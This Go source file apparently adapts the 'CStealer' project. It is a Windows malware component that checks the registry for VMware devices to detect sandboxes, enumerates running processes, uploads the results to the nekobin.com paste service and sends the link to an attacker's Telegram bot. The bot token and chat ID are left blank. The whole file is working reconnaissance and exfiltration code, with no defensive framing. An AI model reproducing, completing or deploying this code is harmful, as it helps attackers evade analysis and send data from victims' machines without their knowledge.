package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
        "net/url"
        "unsafe"
        "syscall"
        "golang.org/x/sys/windows"

	"golang.org/x/sys/windows/registry"
)

// Constants for Windows API
const (
	TH32CS_SNAPPROCESS = 0x00000002
	MAX_PATH           = 260
)


type PROCESSENTRY32 struct {
	DwSize              uint32
	CntUsage            uint32
	Th32ProcessID       uint32
	Th32DefaultHeapID   uintptr
	Th32ModuleID        uint32
	CntThreads          uint32
	Th32ParentProcessID uint32
	PcPriClassBase      int32
	DwFlags             uint32
	SzExeFile           [windows.MAX_PATH]uint16
}


// This piece of code is just a re-write from CStealer Project from github
func checkRegistry() bool {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Enum\IDE`, registry.READ)
	if err != nil {
		return false
	}
	defer key.Close()

	subkeys, err := key.ReadSubKeyNames(-1)
	if err != nil {
		return false
	}

	for _, subkey := range subkeys {
		if strings.HasPrefix(subkey, "VMWARE") {
			return true 
		}
	}

	return false // No VM Detected
}


func exitProgram(message string) {
	fmt.Println(message)
	os.Exit(1)
}


func enumerateProcesses() []map[string]interface{} {
	var processes []map[string]interface{}


	snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		exitProgram("Error creating process snapshot")
	}
	defer syscall.CloseHandle(snapshot)

	
	var pe32 syscall.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	
	err = syscall.Process32First(snapshot, &pe32)
	if err != nil {
		exitProgram("Error retrieving process information")
	}

	
	for {
		process := make(map[string]interface{})
		process["PID"] = pe32.ProcessID
		process["Name"] = syscall.UTF16ToString(pe32.ExeFile[:])

		// Append process information to the list
		processes = append(processes, process)

		// Move to the next process in the snapshot
		err = syscall.Process32Next(snapshot, &pe32)
		if err != nil {
			break
		}
	}

	return processes
}


func createNekobinDocument(processes []map[string]interface{}, vmDetected bool) string {
	vmStatus := "VM Detected"
	if !vmDetected {
		vmStatus = "No VM Detected"
	}

	var content bytes.Buffer
	content.WriteString(fmt.Sprintf("%s\n\n", vmStatus))

	for _, process := range processes {
		content.WriteString(fmt.Sprintf("Process ID: %v, Process Name: %v\n", process["PID"], process["Name"]))
	}

	url := "https://nekobin.com/api/documents"
	data := map[string]string{"content": content.String()}

	jsonData, err := json.Marshal(data)
	if err != nil {
		exitProgram("Error creating JSON data")
	}

	response, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		exitProgram(fmt.Sprintf("Error creating document. %v", err))
	}
	defer response.Body.Close()

	responseData, err := ioutil.ReadAll(response.Body)
	if err != nil {
		exitProgram("Error reading response data")
	}

	var jsonResponse map[string]interface{}
	err = json.Unmarshal(responseData, &jsonResponse)
	if err != nil {
		exitProgram("Error decoding JSON response")
	}

	if result, ok := jsonResponse["result"].(map[string]interface{}); ok {
		if key, ok := result["key"].(string); ok {
			nekobinURL := fmt.Sprintf("https://nekobin.com/%s", key)
			fmt.Println("Nekobin URL:", nekobinURL)
			return nekobinURL
		}
	}

	fmt.Println("Error creating document. Response:", jsonResponse)
	return ""
}

func sendMessage(chatID, text string) {
	apiToken := "" // Enter your bot token 
	baseURL := fmt.Sprintf("https://api.telegram.org/bot%s", apiToken)

	// Ensure proper URL encoding for chatID and text
	chatID = url.QueryEscape(chatID)
	text = url.QueryEscape(text)

	url := fmt.Sprintf("%s/sendMessage?chat_id=%s&text=%s", baseURL, chatID, text)

	response, err := http.Get(url)
	if err != nil {
		fmt.Printf("Error sending message. %v\n", err)
		return
	}
	defer response.Body.Close()

	var jsonResponse map[string]interface{}
	err = json.NewDecoder(response.Body).Decode(&jsonResponse)
	if err != nil || jsonResponse["ok"].(bool) != true {
		fmt.Printf("Error sending message. Response: %v\n", jsonResponse)
	}
}


func main() {
	// Check the registry for VM detection
	vmDetected := checkRegistry()

	// Enumerate processes
	processes := enumerateProcesses()

	// Create a single Nekobin document for both VM detection and process details
	nekobinURL := createNekobinDocument(processes, vmDetected)

	// Send the Nekobin link to the specified Telegram chat
	if nekobinURL != "" {
		chatID := "" // Replace with the actual chat ID you want to send the message to
		messageText := fmt.Sprintf("VM Detection Status: %s\n\nNekobin Link: %s", map[bool]string{true: "VM Detected", false: "No VM Detected"}[vmDetected], nekobinURL)
		sendMessage(chatID, messageText)
	}
}
